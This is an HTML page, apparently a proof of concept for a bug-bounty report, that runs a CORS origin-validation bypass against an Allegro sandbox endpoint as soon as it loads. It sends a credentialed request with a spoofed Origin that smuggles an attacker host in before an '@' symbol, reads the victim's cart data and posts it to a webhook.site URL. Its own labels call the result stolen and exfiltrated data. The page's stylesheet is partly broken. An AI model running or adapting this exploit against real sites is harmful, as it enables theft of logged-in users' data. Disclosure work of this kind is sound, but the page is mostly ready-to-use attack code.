<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">

    <style>
        body {

        }
        .container {
            background: #1a1a1a;
            padding: 40px;

            max-width: 600px;
            width: 90%;
            text-align: center;
            border: 1px solid #333;
        }
        h1 {
            color: #00ff88;

            font-size: 28px;
        }
        .subtitle {
            color: #888;
            margin-bottom: 30px;
            font-size: 14px;
        }
        #status {
            padding: 15px;

            margin: 20px 0;
            font-weight: bold;
            display: none;
        }
        #status.loading {
            display: block;
            background: #1a3a2a;
            color: #00ff88;
            border: 1px solid #00ff88;
        }
        #status.success {
            display: block;

        #status.error {

            background: #111;

            color: #00ff88;
            overflow-x: auto;
            border: 1px solid #333;

            color: #888;

        }

            display: inline-block;
            background: #ff4444;

            margin-bottom: 10px;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="badge">🔴 CRITICAL</div>
    <h1>🔓 Allegro CORS Exploit</h1>
    <p class="subtitle">Proof of Concept - Origin Validation Bypass via @ Symbol</p>
    
    <div id="status" class="loading">⏳ Exploiting...</div>
    
    <div class="data-box" id="dataDisplay">Waiting for response...</div>
    
    <div class="webhook">
        📡 Webhook: <span id="webhookDisplay">https://webhook.site/f70c1845-2b4d-47e3-b426-11f8da61c242</span>
    </div>
</div>

<script>
// ============================================================
//  CONFIGURATION - Update these if needed
// ============================================================

const WEBHOOK_URL = 'https://webhook.site/f70c1845-2b4d-47e3-b426-11f8da61c242';
const MALICIOUS_ORIGIN = 'https://attacker.com@allegro.cz.allegrosandbox.pl';
const TARGET = 'https://edge.allegro.cz.allegrosandbox.pl';

// ============================================================
//  EXPLOIT CODE
// ============================================================

const statusDiv = document.getElementById('status');
const dataDisplay = document.getElementById('dataDisplay');

function setStatus(type, message) {
    statusDiv.className = type;
    statusDiv.textContent = message;
    statusDiv.style.display = 'block';
}

function displayData(data) {
    dataDisplay.textContent = JSON.stringify(data, null, 2);
}

async function exploit() {
    try {
        setStatus('loading', '⏳ Sending request to steal cart data...');
        
        // STEP 1: Fetch cart data with malicious Origin
        const response = await fetch(TARGET + '/cart', {
            credentials: 'include',
            headers: {
                'Accept': 'application/vnd.allegro.internal.v1+json',
                'Origin': MALICIOUS_ORIGIN
            }
        });
        
        const cartData = await response.json();
        displayData(cartData);
        
        setStatus('loading', '📤 Sending stolen data to webhook...');
        
        // STEP 2: Send stolen data to webhook
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                cart: cartData,
                timestamp: new Date().toISOString(),
                origin: MALICIOUS_ORIGIN,
                url: window.location.href,
                userAgent: navigator.userAgent
            })
        });
        
        setStatus('success', '✅ EXPLOIT COMPLETE! Data stolen and exfiltrated!');
        
        console.log('✅ Cart data:', cartData);
        console.log('📤 Sent to webhook:', WEBHOOK_URL);
        
    } catch (error) {
        setStatus('error', '❌ Error: ' + error.message);
        console.error('Exploit error:', error);
    }
}

// Auto-execute when page loads
window.onload = function() {
    console.log('🚀 Allegro CORS Exploit starting...');
    console.log('🎯 Target:', TARGET);
    console.log('🔑 Origin:', MALICIOUS_ORIGIN);
    console.log('📡 Webhook:', WEBHOOK_URL);
    
    // Wait 1 second then exploit
    setTimeout(exploit, 1000);
};
</script>
